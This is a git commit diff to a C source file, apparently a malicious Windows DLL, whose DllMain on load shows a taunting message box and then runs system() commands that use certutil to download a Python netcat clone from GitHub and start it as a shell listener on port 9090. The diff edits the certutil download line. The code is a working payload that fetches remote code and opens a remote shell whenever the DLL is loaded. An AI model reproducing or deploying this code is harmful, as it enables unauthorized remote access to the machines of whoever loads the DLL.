3885612766c03f433cfe979882c34be124dc746a
joshmerr <joshmerrill255@gmail.com>
2022-04-07 14:25:41 -0400

    shell

--- dll/shell.c
+++ dll/shell.c
@@ -8,7 +8,7 @@ DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
         case DLL_PROCESS_ATTACH:
             MessageBox(NULL, "I love balls in my face lol.. so sus lol i cant beluve you fell for it lmfao lol", "balls", MB_ICONERROR | MB_OK);
             int i;
-            i = system ("certutil -urlcache -split -f http://192.168.119.152/nc.exe.txthttps://raw.githubusercontent.com/stackviolator/blackhatpython/main/networking/netcat/netcat.py .\\nc.py");
+            i = system ("certutil urlcache -split -f https://raw.githubusercontent.com/stackviolator/blackhatpython/main/networking/netcat/netcat.py .\\nc.py");
             i = system ("python .\\nc.py -t 10.118.53.64 -l -c -p 9090");
             break;
     }
